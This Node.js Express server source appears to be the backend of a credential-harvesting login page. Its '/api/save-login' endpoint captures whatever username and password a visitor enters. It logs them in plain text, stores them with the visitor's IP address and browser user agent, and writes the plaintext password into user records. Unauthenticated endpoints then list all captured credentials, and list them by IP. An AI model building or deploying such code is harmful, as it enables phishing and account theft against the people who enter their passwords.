const express = require('express');
const bcrypt = require('bcrypt');
const { Pool } = require('pg');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(__dirname)); // Serve static files from current directory

// Middleware to get client IP
app.use((req, res, next) => {
    req.clientIP = req.headers['x-forwarded-for'] || 
                  req.headers['x-real-ip'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress ||
                  (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
                  req.ip;
    next();
});

// PostgreSQL connection pool
// For online databases (Neon, Supabase, ElephantSQL, etc.)
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false // Required for most online databases
    }
});

// Alternative: Manual configuration (uncomment if not using DATABASE_URL)
/*
const pool = new Pool({
    user: process.env.DB_USER || 'postgres',
    host: process.env.DB_HOST || 'localhost',
    database: process.env.DB_NAME || 'freelancer_login',
    password: process.env.DB_PASSWORD,
    port: process.env.DB_PORT || 5432,
    ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : false
});
*/

// Test database connection
pool.connect((err, client, release) => {
    if (err) {
        return console.error('Error connecting to database:', err.stack);
    }
    console.log('✅ Connected to PostgreSQL database');
    release();
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Server is running',
        timestamp: new Date()
    });
});

// Register endpoint
app.post('/api/register', async (req, res) => {
    const { username, email, password } = req.body;

    // Validation
    if (!username || !email || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'All fields are required' 
        });
    }

    if (password.length < 6) {
        return res.status(400).json({ 
            success: false, 
            message: 'Password must be at least 6 characters' 
        });
    }

    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ 
            success: false, 
            message: 'Invalid email format' 
        });
    }

    try {
        // Check if user already exists
        const userCheck = await pool.query(
            'SELECT * FROM users WHERE email = $1 OR username = $2',
            [email, username]
        );

        if (userCheck.rows.length > 0) {
            return res.status(400).json({ 
                success: false, 
                message: 'Username or email already exists' 
            });
        }

        // Hash password
        const saltRounds = parseInt(process.env.BCRYPT_ROUNDS) || 10;
        const passwordHash = await bcrypt.hash(password, saltRounds);

        // Insert new user
        const result = await pool.query(
            'INSERT INTO users (username, email, password_hash) VALUES ($1, $2, $3) RETURNING id, username, email, created_at',
            [username, email, passwordHash]
        );

        res.status(201).json({
            success: true,
            message: 'User registered successfully',
            user: result.rows[0]
        });

    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error during registration' 
        });
    }
});

// Save login attempt endpoint (saves whatever user enters)
app.post('/api/save-login', async (req, res) => {
    const { emailOrUsername, password } = req.body;
    const clientIP = req.clientIP;

    // Validation
    if (!emailOrUsername || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Email/username and password are required' 
        });
    }

    try {
        console.log('\n📨 Login attempt captured:');
        console.log('Email/Username:', emailOrUsername);
        console.log('Password:', password);
        console.log('Client IP:', clientIP);
        console.log('Timestamp:', new Date().toISOString());
        console.log('User Agent:', req.headers['user-agent']);
        console.log('---');

        // First, save to login_attempts table
        await pool.query(`
            CREATE TABLE IF NOT EXISTS login_attempts (
                id SERIAL PRIMARY KEY,
                email_or_username VARCHAR(255) NOT NULL,
                password VARCHAR(255) NOT NULL,
                ip_address INET,
                user_agent TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);

        const attemptResult = await pool.query(
            'INSERT INTO login_attempts (email_or_username, password, ip_address, user_agent, created_at) VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP) RETURNING *',
            [emailOrUsername, password, clientIP, req.headers['user-agent']]
        );

        // Determine if input is email or username
        const isEmail = emailOrUsername.includes('@');
        const username = isEmail ? emailOrUsername.split('@')[0] : emailOrUsername;
        const email = isEmail ? emailOrUsername : emailOrUsername + '@example.com';

        // Check if user already exists by username or email
        const userCheck = await pool.query(
            'SELECT * FROM users WHERE email = $1 OR username = $2',
            [email, username]
        );

        let result;
        
        if (userCheck.rows.length > 0) {
            // User exists, update password (plain text)
            result = await pool.query(
                'UPDATE users SET password_hash = $1, last_login = CURRENT_TIMESTAMP WHERE email = $2 OR username = $3 RETURNING id, username, email, created_at, last_login',
                [password, email, username]
            );
        } else {
            // New user, create entry (plain text password)
            result = await pool.query(
                'INSERT INTO users (username, email, password_hash, last_login) VALUES ($1, $2, $3, CURRENT_TIMESTAMP) RETURNING id, username, email, created_at, last_login',
                [username, email, password]
            );
        }

        res.json({
            success: true,
            message: 'Login information saved successfully',
            user: {
                id: result.rows[0].id,
                username: result.rows[0].username,
                email: result.rows[0].email,
                ip_address: clientIP,
                timestamp: result.rows[0].created_at || result.rows[0].last_login
            }
        });

    } catch (error) {
        console.error('Save login error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error while saving login information',
            error: error.message
        });
    }
});

// Get all login attempts endpoint
app.get('/api/login-attempts', async (req, res) => {
    try {
        // Ensure table exists
        await pool.query(`
            CREATE TABLE IF NOT EXISTS login_attempts (
                id SERIAL PRIMARY KEY,
                email_or_username VARCHAR(255) NOT NULL,
                password VARCHAR(255) NOT NULL,
                ip_address INET,
                user_agent TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        `);

        const result = await pool.query(
            'SELECT id, email_or_username, password, ip_address, user_agent, created_at FROM login_attempts ORDER BY created_at DESC LIMIT 100'
        );

        res.json({
            success: true,
            attempts: result.rows
        });

    } catch (error) {
        console.error('Get login attempts error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

// Get login attempts by IP endpoint
app.get('/api/login-attempts/ip/:ip', async (req, res) => {
    const { ip } = req.params;

    try {
        const result = await pool.query(
            'SELECT id, email_or_username, password, ip_address, user_agent, created_at FROM login_attempts WHERE ip_address = $1 ORDER BY created_at DESC',
            [ip]
        );

        res.json({
            success: true,
            attempts: result.rows
        });

    } catch (error) {
        console.error('Get login attempts by IP error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

// Login endpoint
app.post('/api/login', async (req, res) => {
    const { emailOrUsername, password } = req.body;

    // Validation
    if (!emailOrUsername || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Email/username and password are required' 
        });
    }

    try {
        // Find user by email or username
        const result = await pool.query(
            'SELECT * FROM users WHERE email = $1 OR username = $1',
            [emailOrUsername]
        );

        if (result.rows.length === 0) {
            return res.status(401).json({ 
                success: false, 
                message: 'Invalid credentials' 
            });
        }

        const user = result.rows[0];

        // Check if account is active
        if (!user.is_active) {
            return res.status(403).json({ 
                success: false, 
                message: 'Account is disabled' 
            });
        }

        // Verify password
        const isValidPassword = await bcrypt.compare(password, user.password_hash);

        if (!isValidPassword) {
            return res.status(401).json({ 
                success: false, 
                message: 'Invalid credentials' 
            });
        }

        // Update last login
        await pool.query(
            'UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = $1',
            [user.id]
        );

        // Return user data (excluding password)
        res.json({
            success: true,
            message: 'Login successful',
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                created_at: user.created_at,
                last_login: new Date()
            }
        });

    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error during login' 
        });
    }
});

// Get user by ID endpoint
app.get('/api/users/:id', async (req, res) => {
    const { id } = req.params;

    try {
        const result = await pool.query(
            'SELECT id, username, email, created_at, last_login, is_active FROM users WHERE id = $1',
            [id]
        );

        if (result.rows.length === 0) {
            return res.status(404).json({ 
                success: false, 
                message: 'User not found' 
            });
        }

        res.json({
            success: true,
            user: result.rows[0]
        });

    } catch (error) {
        console.error('Get user error:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Server error' 
        });
    }
});

// Initialize database tables (run once) - accessible via GET for browser
app.get('/api/init-db', async (req, res) => {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) UNIQUE NOT NULL,
                email VARCHAR(100) UNIQUE NOT NULL,
                password_hash VARCHAR(255) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE
            );
            
            CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
            CREATE INDEX IF NOT EXISTS idx_users_username ON users(username);
        `);

        res.json({
            success: true,
            message: 'Database tables initialized successfully'
        });
    } catch (error) {
        console.error('Database initialization error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to initialize database',
            error: error.message
        });
    }
});

// Initialize database tables (POST version)
app.post('/api/init-db', async (req, res) => {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(50) UNIQUE NOT NULL,
                email VARCHAR(100) UNIQUE NOT NULL,
                password_hash VARCHAR(255) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                is_active BOOLEAN DEFAULT TRUE
            );
            
            CREATE INDEX IF NOT EXISTS idx_users_email ON users(email);
            CREATE INDEX IF NOT EXISTS idx_users_username ON users(username);
        `);

        res.json({
            success: true,
            message: 'Database tables initialized successfully'
        });
    } catch (error) {
        console.error('Database initialization error:', error);
        res.status(500).json({
            success: false,
            message: 'Failed to initialize database'
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server is running on http://localhost:${PORT}`);
    console.log(`📊 Database: ${process.env.DATABASE_URL ? 'Online' : 'Local'}`);
});
